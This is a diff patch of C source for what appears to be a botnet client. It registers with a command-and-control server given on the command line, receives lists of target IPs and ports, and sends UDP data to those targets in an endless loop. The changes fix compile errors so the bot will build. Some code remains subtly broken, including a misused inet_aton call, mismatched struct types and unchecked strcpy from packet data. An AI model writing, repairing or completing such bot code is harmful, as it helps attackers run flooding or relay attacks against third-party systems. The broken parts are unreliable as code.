@@ -59,7 +59,7 @@ void parse_packet(struct msg *message, char *packet, int bytes_recv)
     for(i = 0; i < counter; i++){
         
         strcpy(message->entry[i].ip_address, packet);
-        packet += sizeof(message->entry[i].ip);
+        packet += sizeof(message->entry[i].ip_address);
 
         strcpy(message->entry[i].port_number, packet);
         packet += sizeof(message->entry[i].port_number);
@@ -81,7 +81,7 @@ void prog(int sockfd, struct msg *message, char *payload)
     udp_server.sin_addr.s_addr = inet_aton(udp_server_ip);
     udp_server.sin_port = htons(atoi(udp_server_port));
 
-    sendto(sockfd, data, strlen(data), 0
+    sendto(sockfd, data, strlen(data), 0,
            (const struct sockaddr *) &udp_server,
            sizeof(udp_server));
 
@@ -117,17 +117,18 @@ int main(int argc, char **argv)
 
     char payload[BUFLEN];
     char packet[BUFLEN];
+    struct message message;
 
-    char *c&c_ip = argv[1];
-    char *c&c_port = argv[2];
+    char *cnc_ip = argv[1];
+    char *cnc_port = argv[2];
 
     int sockfd = udp_socket();
     
-    reg(sockfd, c&c_ip, c&c_port);
+    reg(sockfd, cnc_ip, cnc_port);
    
     while(1){
 
-        int bytes_recv = recvfrom(sock, packet, BUFLEN,
+        int bytes_recv = recvfrom(sockfd, packet, BUFLEN,
                                   0, NULL, NULL);
         
         parse_packet(&message, packet, bytes_recv);
